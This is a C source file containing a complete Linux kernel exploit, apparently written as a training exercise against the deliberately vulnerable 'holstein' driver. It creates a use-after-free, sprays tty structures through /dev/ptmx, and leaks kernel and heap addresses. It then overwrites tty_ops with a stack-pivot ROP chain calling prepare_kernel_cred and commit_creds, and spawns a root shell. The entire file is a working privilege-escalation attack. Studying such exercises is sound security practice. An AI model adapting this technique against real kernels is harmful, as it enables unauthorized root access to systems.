#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>

#define for_x(i, a, b) for(int i = a; i <= b; i++)
#define for_n(i, a, b) for(int i = a; i >= b; i--)
#define inc idx++
#define save_state(val)                                   \
    do {                                                  \
        __asm__(                                          \
            ".intel_syntax noprefix;"                     \
            "mov user_cs, cs;"                            \
            "mov user_ss, ss;"                            \
            "mov user_rsp, rsp;"                          \
            "mov user_rbp, rbp;" /*this to make sure stack frame doesnt corrupted*/ \
            "pushfq;"                                     \
            "pop user_rflags;"                            \
            ".att_syntax;"                                \
        );                                                \
        user_rip = val;                                   \
        puts("[$] saved state");                          \
    } while (0)

typedef uint64_t u64;

u64 fd1, fd2, fd3, fd4;
u64 spray[105];
u64 user_rip, user_cs, user_rflags, user_rsp, user_ss, user_rbp;
u64 kbase, g_buf, koffset;
char buf[0x505]; // declaration in global to prevent bad coding pratice (etc, forget to rewrite struct metadata value when heap overflow)
u64 rop[105];

void win()
{
    if(getuid() == 0)
    {
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {NULL};
        puts("[*] enjoy");
        execve(argv[0], argv, envp);
    }
    else puts("[!] fail uid");
}

void uaf_heap_spray()
{
	fd1 = open("/dev/holstein", O_RDWR);
	fd2 = open("/dev/holstein", O_RDWR);
	close(fd1);
	for_x(i, 0, 100) spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY); 
}

void leak()
{
	read(fd2, buf, 0x400);
	kbase = *(u64 *)(&buf[0x248]) - 0x31b3e0;
	g_buf = *(u64 *)(&buf[0x38]) - 0x38;
	printf("[*] kbase: 0x%lx\n", kbase);
    printf("[*] g_buf: 0x%lx\n", g_buf);

    koffset = kbase - 0xffffffff81000000;
    printf("[?] koffset: 0x%lx\n", koffset);
}

void cleanup() // prevent program hanging error (cant interactive) (found out when i leak then return but didnt close spray[0], i dont know why) its good pratice to clean up memory be4 terminate
{
    close(fd2);
    close(fd4);
    for_x(i, 0, 100) close(spray[i]);
}


void prepare_rop_chain()
{
    // prepare rop chain
    u64 prepare_kernel_cred = koffset + 0xffffffff81072560;
    u64 commit_creds = koffset + 0xffffffff810723c0;
    u64 pop_rdi = koffset + 0xffffffff812bf3d3;
    u64 pop_rcx = koffset + 0xffffffff8150b6d6; // set rcx to null to help the mov_rdi_rax gadget
    u64 mov_rdi_rax = koffset + 0xffffffff81638e9b; // mov rdi, rax; rep movsq [rdi], [rsi]; ret;
    u64 swapgs_n_ret2usr_chain = koffset + 0xffffffff81800e26;

    u64 pivot_gadget = koffset + 0xffffffff8114fbea; // ropr --nouniq -R "^push rdx;.* pop rsp;.* ret" ./vmlinux
    // 0xffffffff8114fbea: push rdx; xor eax, 0x415b004f; pop rsp; pop rbp; ret;

    save_state((u64)(&win)); // this is not stable as i thought, stack frame of prepare_rop_chain and trigger function is different so it can be corrupted -> maybe should write it all in 1 function

    u64 idx = 0;
    rop[inc] = pop_rdi;
    rop[inc] = 0;
    rop[inc] = prepare_kernel_cred;
    rop[inc] = pop_rcx;
    rop[inc] = 0;
    rop[inc] = mov_rdi_rax;
    rop[inc] = commit_creds;
    rop[inc] = swapgs_n_ret2usr_chain;
    rop[inc] = 0; // [rdi]
    rop[inc] = 0; // [rdi + 8]
    rop[inc] = user_rip;
    rop[inc] = user_cs;
    rop[inc] = user_rflags;
    rop[inc] = user_rsp;
    rop[inc] = user_ss;
    rop[inc] = pivot_gadget; // offset 15 (insert here to save memory)

    printf("[*] rop chain prepared, length: %lu\n", idx);
    write(fd2, rop, 0x400);
}

void uaf_trigger()
{
    // uaf
    fd3 = open("/dev/holstein", O_RDWR);
    fd4 = open("/dev/holstein", O_RDWR);
    close(fd3);
    for_x(i, 0, 100) spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);

    // restore tty struct value to rewrite later
    read(fd4, buf, 0x400);
    // overwrite tty_ops ptr
    *(u64 *)(&buf[0x18]) = (g_buf + 15 * 8) - (0xc * 8); // padding the pivot_gadget at 0xc offset
    // overwrite
    write(fd4, buf, 0x400);
    // trigger
    puts("[*] trigger");
    for_x(i, 0, 100) ioctl(spray[i], 0, g_buf - 0x8);

    puts("[!] should never be reach");
}

int main()
{
	uaf_heap_spray();
	leak();
    prepare_rop_chain();
    uaf_trigger();
    cleanup();
}